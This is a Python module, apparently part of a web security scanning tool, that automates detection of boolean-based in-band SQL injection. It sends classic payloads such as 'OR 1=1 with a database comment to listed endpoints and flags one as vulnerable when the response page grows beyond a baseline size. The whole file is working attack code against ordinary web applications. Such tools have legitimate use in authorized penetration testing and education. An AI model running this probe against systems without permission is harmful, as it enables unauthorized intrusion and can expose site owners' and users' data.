import requests

from utils.auxiliary import *

payloads = [
    "'OR 1=0",
    "'OR 1=1",
    "'AND 1=0",
    "'AND 1=1",
]


# def find_diff(init_r, r):
#     soup_1 = BeautifulSoup(init_r.text, 'html.parser')
#     soup_2 = BeautifulSoup(r.text, 'html.parser')
#     html_1 = soup_1.prettify()
#     html_2 = soup_2.prettify()
#     cases = [(html_1, html_2)]
#     for a,b in cases:
#         for i,s in enumerate(difflib.ndiff(a,b)):
#             if s[0]=='+':
#                 print(u'{}'.format(s[-1]),end='')


def try_boolean_sqli(url, options: list):
    log = Auxiliary(__name__)
    log.set_config()
    vuln_endpoints = options[0]
    db_comment = options[1]
    init_r = requests.get(url=url)
    for endp in vuln_endpoints:
        for pld in payloads:
            # URL encoding our payload
            pld = requests.utils.quote(pld + db_comment)
            r = requests.get(url=url + endp + pld)
            log.logger.info(
                f"{BLUE}[*]{RESET} Trying boolean in-band SQLi "
                f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                # If new page size is bigger, we have found additional content
                if len(r.text) > len(init_r.text):
                    log.logger.info(
                        f"{GREEN}[+]{RESET} Confirmed boolean in-band SQLi "
                        f"on endpoint {url + endp + pld}")
                    log.logger.info(
                        f"{GREEN}[+]{RESET} New page "
                        f"size is {len(r.text)} instead "
                        f"of default {len(init_r.text)}")
                    return endp
